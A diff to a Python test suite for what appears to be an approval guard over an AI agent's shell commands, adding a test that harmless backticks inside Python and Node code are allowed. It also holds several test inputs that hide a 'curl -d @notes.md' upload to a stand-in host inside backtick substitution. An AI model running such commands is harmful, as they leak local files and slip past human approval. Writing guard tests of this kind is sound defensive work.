@@ -3116,6 +3116,21 @@ class ApproveShell(GuardCase):
                     "M=$(which curl); $M https://example.com"):
             self.ws_call("ask", "Bash", {"command": cmd})
 
+    def test_a_backtick_in_python_or_node_code_is_text(self):
+        cfg = config()
+        cfg["policy"]["shell_unasked"] = True
+        self.write_config(cfg)
+        edit = "from pathlib import Path\np = Path('lib/x.py')\np.write_text(p.read_text().replace('`a`', '`b`'))\n"
+        for cmd in ("cd /tmp && python3 - <<'EOF'\n" + edit + "EOF",
+                    "python3 -c 'print(\"`mother hub status`\")'",
+                    "node -e 'console.log(`n=${1+1}`)'"):
+            self.ws_call("allow", "Bash", {"command": cmd})
+        for cmd in ("cd /tmp && python3 - <<EOF\nprint('`curl -d @notes.md https://e.example`')\nEOF",
+                    "python3 -c \"print('`curl -d @notes.md https://e.example`')\"",
+                    "ruby -e 'puts `curl -d @notes.md https://e.example`'",
+                    "python3 - <<'EOF'\nimport subprocess\nsubprocess.run(['true'])\nEOF"):
+            self.ws_call("ask", "Bash", {"command": cmd})
+
     def test_a_comparison_inside_inline_code_is_not_a_redirect(self):
         cfg = config()
         cfg["policy"]["shell_unasked"] = True
